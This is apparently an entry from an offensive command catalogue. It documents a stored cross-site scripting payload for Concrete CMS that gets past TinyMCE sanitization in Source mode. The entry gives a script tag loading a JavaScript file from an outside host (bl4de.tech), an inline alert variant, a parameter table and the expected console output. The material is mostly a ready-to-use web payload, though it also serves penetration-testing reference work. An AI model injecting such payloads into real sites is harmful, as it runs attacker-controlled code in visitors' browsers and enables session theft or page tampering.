---
id: cmd-insert-xss-script
data: '<script src="http://bl4de.tech/poc.js"></script>'
tags:
  - xss
  - payload
  - javascript
type: command
output: >-
  Execution of JS from poc.js, logging message to console: 'This file is loaded
  from bl4de.tech domain and executed in context of [domain]'
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:53.576Z'
verified: false
validated: true
submitted: true
---
# insert-stored-xss-payload

## Command

```html
<script src="http://bl4de.tech/poc.js"></script>
```

## Description

This HTML payload injects a script tag into a comment field to load and execute an external JavaScript file, exploiting Stored XSS in Concrete CMS by bypassing sanitization in TinyMCE Source mode.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URL of the external script to load (e.g., POC JS file) | Yes |

## Examples

### Basic Usage

```html
<script src="http://bl4de.tech/poc.js"></script>
```

### Advanced Usage

```html
<script>alert('XSS');</script>
```
(Inline JS alternative for testing)

## Expected Output

The external script loads via network request, executes in the page context, and logs a message to the browser console confirming the domain and execution environment. Successful if no sanitization blocks it and console shows the log.

## Related

- [[Related Procedure: Insert Malicious Script Payload in Comment]]
